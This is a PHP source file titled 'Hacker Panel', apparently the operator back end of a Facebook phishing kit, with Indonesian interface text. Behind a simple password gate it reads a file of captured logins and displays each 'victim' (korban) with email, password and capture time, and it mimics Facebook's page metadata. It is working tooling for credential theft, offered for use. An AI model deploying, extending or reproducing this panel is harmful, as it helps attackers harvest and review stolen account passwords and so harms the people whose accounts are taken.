<?php
session_start();

if($_GET['act']=='logout'){
session_destroy();
header('location:hacker.php');
}

echo '<?xml version="1.0" encoding="utf-8"?>';

echo '<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">';

echo '<html xmlns="http://www.w3.org/1999/xhtml">';

echo '<head><title>Hacker Panel</title><meta name="description" content="Facebook helps you connect and share with the people in your life." /><meta name="referrer" content="default" id="meta_referrer" /><noscript><meta http-equiv="X-Frame-Options" content="deny" /></noscript>';
echo '<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />';
echo '<link rel="stylesheet" href="http://choky.wapsite.me/wapmaster/jcms.css" type="text/css" />';

echo '</head>';
if(file_exists('pass.php')){
include 'pass.php';
}
if(isset($passw)){

if(isset($_SESSION['passw'])){
echo '<div class="phdr"><center><b>Daftar korban</b></center></div>';
echo '<div class="tmn">';
if(file_exists('pass.txt')){
$file=fopen('pass.txt',r);
$files=fgets($file);
if(!empty($files)){
$potong=explode('|#|',$files);
foreach($potong as $hasil){
$data=explode('|',$hasil);
if(!empty($hasil)){
echo '<div class="clip">Email: '.$data['0'].'<br />Pass: '.$data['1'].'<br />Terjebak: '.$data['2'].'</div>';
}
}
}else{
echo '<div class="clip">Belum ada yang terjebak</div>';
}

fclose($file);
}else{
echo '<div class="clip">Belum ada korban</div>';
}
echo '</div>';


}else{
echo '<div class="phdr"><center><b>Login</b></center></div>';

echo '<div class="clip">';
if($_POST['login']){
$pas=md5($_POST['pass']);
if($pas != $passw){
echo '<div class="alarm">Password salah</div>';
}else{
$_SESSION['passw']=$pas;
header('location:hacker.php');
}
}


echo '<form method="post" action="?">Password:<br /><input type="password" name="pass" value=""><br /><input type="submit" name="login" value="Log In"></form></div>';


}




}else{
echo '<div class="phdr"><center><b>Atur Password</b></center></div>';
if($_POST['save']){

$passw=$_POST['passw'];
if(preg_match("/[^0-9]/",$passw)){
echo '<div class="alarm">Password karakternya angka aja gan jangan pake huruf atau symbol</div>';
}else{
$file=fopen('pass.php',w);
$pw=md5($passw);
$adm = "<?php\r\n\r\n" .
'$passw = ' . "'$pw';\r\n\r\n" .
'?>';


$create=fwrite($file,$adm);
fclose($file);
header('location:hacker.php');
}

}

echo '<div class="clip">';
echo '<form method="post" action="?">Silahkan atur password dulu. Ini digunakan untuk mengakses data pada panel admin.<br /><input name="passw" type="text" value=""><br /><input type="submit" name="save" value="Simpan"></form></div>';

}
echo '<div class="tmn"><div class="list1"><a href="index.php">Index</a></div>';
if(isset($_SESSION['passw'])){
echo '<div class="list1"><a href="hacker.php?act=logout">Log out</a></div>';
}
echo '<div class="list1"><a href="http://gretongerz72.mywapblog.com">Gretongerz72 Mobile blog</a></div>';

echo '</div></body></html>';

?>
